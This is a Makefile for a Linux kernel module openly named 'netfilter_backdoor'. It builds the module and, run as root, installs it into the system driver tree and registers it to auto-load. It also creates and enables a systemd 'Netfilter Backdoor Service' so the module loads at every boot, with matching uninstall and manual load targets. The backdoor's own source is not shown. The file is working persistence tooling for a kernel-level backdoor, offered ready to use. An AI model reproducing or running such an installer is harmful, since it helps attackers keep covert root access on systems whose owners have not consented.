# Kernel module settings
obj-m += netfilter_backdoor.o

KERNEL_DIR ?= /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)
MODULE_NAME := netfilter_backdoor.ko
MODULE_BASE := $(basename $(MODULE_NAME))
INSTALL_DIR := /lib/modules/$(shell uname -r)/kernel/drivers/net
MODULE_LOAD_FILE := /etc/modules-load.d/netfilter_backdoor.conf
SERVICE_FILE := /etc/systemd/system/netfilter_backdoor.service

.PHONY: all module user clean remove install uninstall

# Default target builds both
all: module

# Kernel module build
module:
	@if [ ! -d "$(KERNEL_DIR)" ]; then \
		echo "[-] Kernel headers not found in $(KERNEL_DIR)"; \
		echo "    Install them using your package manager:"; \
		echo "    Ubuntu: sudo apt install linux-headers-$(shell uname -r)"; \
		echo "    RHEL:   sudo dnf install kernel-devel-$(shell uname -r)"; \
		echo "    Arch:   sudo pacman -S linux-headers"; \
		exit 1; \
	fi
	@echo "[*] Building kernel module..."
	make -C $(KERNEL_DIR) M=$(PWD) modules

# Install module for auto-load at boot
install: module
	@echo "[*] Installing module for auto-load at boot..."
	@if [ "$$(id -u)" -ne 0 ]; then \
		echo "[-] Root required for installation."; \
		exit 1; \
	fi
	@echo "  [+] Installing module to system directory..."
	mkdir -p $(INSTALL_DIR)
	cp $(MODULE_NAME) $(INSTALL_DIR)/
	
	@echo "  [+] Updating module dependencies..."
	depmod -a
	
	@echo "  [+] Creating module load config..."
	echo "$(MODULE_BASE)" > $(MODULE_LOAD_FILE)
	
	@echo "  [+] Creating systemd service file..."
	echo "[Unit]" > $(SERVICE_FILE)
	echo "Description=Netfilter Backdoor Service" >> $(SERVICE_FILE)
	echo "After=network.target" >> $(SERVICE_FILE)
	echo "" >> $(SERVICE_FILE)
	echo "[Service]" >> $(SERVICE_FILE)
	echo "Type=oneshot" >> $(SERVICE_FILE)
	echo "ExecStart=/sbin/modprobe $(MODULE_BASE)" >> $(SERVICE_FILE)
	echo "" >> $(SERVICE_FILE)
	echo "[Install]" >> $(SERVICE_FILE)
	echo "WantedBy=multi-user.target" >> $(SERVICE_FILE)
	
	@echo "  [+] Enabling service..."
	systemctl daemon-reload
	systemctl enable netfilter_backdoor.service
	
	@echo "[+] Module installed successfully. It will load automatically at boot."

# Uninstall module and related files
uninstall:
	@echo "[*] Uninstalling module..."
	@if [ "$$(id -u)" -ne 0 ]; then \
		echo "[-] Root required for uninstallation."; \
		exit 1; \
	fi
	@if lsmod | grep -q $(MODULE_BASE); then \
		echo "  [+] Removing loaded module..."; \
		rmmod $(MODULE_BASE); \
	fi
	@echo "  [+] Removing system files..."
	rm -f $(INSTALL_DIR)/$(MODULE_NAME)
	rm -f $(MODULE_LOAD_FILE)
	rm -f $(SERVICE_FILE)
	@echo "  [+] Updating module dependencies..."
	depmod -a
	@echo "  [+] Disabling service..."
	systemctl daemon-reload
	systemctl disable netfilter_backdoor.service 2>/dev/null || true
	@echo "[+] Module uninstalled successfully."

# Insert module manually
insert: module
	@echo "[*] Inserting module..."
	@if [ "$$(id -u)" -ne 0 ]; then \
		echo "[-] Root required to insert kernel module."; \
		exit 1; \
	fi
	insmod $(MODULE_NAME)
	@echo "[+] Module inserted."

# Remove module manually
remove:
	@echo "[*] Removing kernel module..."
	@if [ "$$(id -u)" -ne 0 ]; then \
		echo "[-] Root required to remove kernel module."; \
		exit 1; \
	fi
	rmmod $(MODULE_BASE) || true
	@echo "[+] Module removed."

# Clean build artifacts
clean:
	@echo "[*] Cleaning kernel module build artifacts..."
	make -C $(KERNEL_DIR) M=$(PWD) clean